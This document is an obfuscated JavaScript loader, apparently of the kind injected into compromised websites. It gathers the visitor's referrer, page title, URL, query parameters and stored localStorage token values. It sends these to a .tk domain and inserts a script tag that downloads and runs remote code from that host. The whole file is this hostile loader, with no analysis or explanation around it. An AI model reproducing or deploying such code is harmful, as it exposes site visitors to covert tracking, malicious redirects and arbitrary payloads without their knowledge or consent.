 (function() {
    var name = '_LrqGx2t1TWGD9cNN';
    if (!window._LrqGx2t1TWGD9cNN) {
        window._LrqGx2t1TWGD9cNN = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://teplodistedeli.tk/fitshow',
            P_PATH: 'https://teplodistedeli.tk/fec84ce/postback',
        };
    }
    const _s7ZVMRNbcHrZbWJ6 = localStorage.getItem('config');
    if (typeof _s7ZVMRNbcHrZbWJ6 !== 'undefined' && _s7ZVMRNbcHrZbWJ6 !== null) {
        var _75437YtwWbtvycp4 = JSON.parse(_s7ZVMRNbcHrZbWJ6);
        var _Mg7zLx3dM56gpyGw = Math.round(+new Date()/1000);
        if (_75437YtwWbtvycp4.created_at + window._LrqGx2t1TWGD9cNN.ttl < _Mg7zLx3dM56gpyGw) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _6W65cwNXX6Hy9Ppm = localStorage.getItem('subId');
    var _mxhms27wLPtZ6hzs = localStorage.getItem('token');
    var _3HHJYt6Y5bNXJD46 = '?return=js.client';
        _3HHJYt6Y5bNXJD46 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _3HHJYt6Y5bNXJD46 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _3HHJYt6Y5bNXJD46 += '&default_keyword=' + encodeURIComponent(document.title);
        _3HHJYt6Y5bNXJD46 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _3HHJYt6Y5bNXJD46 += '&name=' + encodeURIComponent(name);
        _3HHJYt6Y5bNXJD46 += '&host=' + encodeURIComponent(window._LrqGx2t1TWGD9cNN.R_PATH);
    if (typeof _6W65cwNXX6Hy9Ppm !== 'undefined' && _6W65cwNXX6Hy9Ppm && window._LrqGx2t1TWGD9cNN.unique) {
        _3HHJYt6Y5bNXJD46 += '&sub_id=' + encodeURIComponent(_6W65cwNXX6Hy9Ppm);
    }
    if (typeof _mxhms27wLPtZ6hzs !== 'undefined' && _mxhms27wLPtZ6hzs && window._LrqGx2t1TWGD9cNN.unique) {
        _3HHJYt6Y5bNXJD46 += '&token=' + encodeURIComponent(_mxhms27wLPtZ6hzs);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._LrqGx2t1TWGD9cNN.R_PATH + _3HHJYt6Y5bNXJD46;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
